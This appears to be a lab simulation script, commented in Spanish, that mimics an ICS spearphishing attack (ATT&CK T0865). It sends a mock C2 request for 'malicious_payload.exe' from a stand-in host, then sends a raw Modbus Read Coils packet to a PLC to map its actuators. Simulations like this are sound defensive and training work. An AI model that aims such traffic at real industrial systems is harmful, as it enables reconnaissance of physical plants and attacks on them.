import socket
import time

IP_PLC = '192.168.70.129'
PORT_WEB = 8081    # Simulará la conexión IT (C2 / Descarga del adjunto)
PORT_ICS = 502     # Simulará el impacto OT (Modbus)

print("[*] Simulando Técnica T0865 - Spearphishing Attachment")
print("[*] Fase 1: El usuario abre el adjunto. El malware conecta con el servidor externo (IT)...")

try:
    # 1. SIMULACIÓN IT: Conexión Web (Genera tráfico HTTP simulado usando el puerto 8081)
    s_it = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_it.connect((IP_PLC, PORT_WEB))
    request = b"GET /malicious_payload.exe HTTP/1.1\r\nHost: c2-server.local\r\n\r\n"
    s_it.send(request)
    s_it.recv(1024)
    s_it.close()
    print("[+] Conexión IT (C2) establecida y payload descargado.")
    time.sleep(1) # Pausa dramática entre IT y OT

    # 2. SIMULACIÓN OT: El malware pivota e inyecta comandos en la fábrica
    print("[*] Fase 2: El malware detecta acceso a la red OT. Iniciando lectura de Coils (FC 01)...")
    s_ot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_ot.connect((IP_PLC, PORT_ICS))
    
    # Payload Modbus: Leer 10 Coils (Bobinas de salida) para mapear los actuadores de la planta
    # Trans ID: 0001, Prot: 0000, Len: 0006, Unit: 01, Func: 01 (Read Coils), Reg: 0000, Qty: 000A
    payload_modbus = b'\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x0A'
    s_ot.send(payload_modbus)
    
    respuesta = s_ot.recv(1024)
    print(f"[+] Comando industrial ejecutado. Respuesta del PLC: {respuesta.hex()}")
    s_ot.close()
    print("[*] Ataque T0865 completado con éxito.")

except Exception as e:
    print(f"[!] Error en la simulación: {e}")
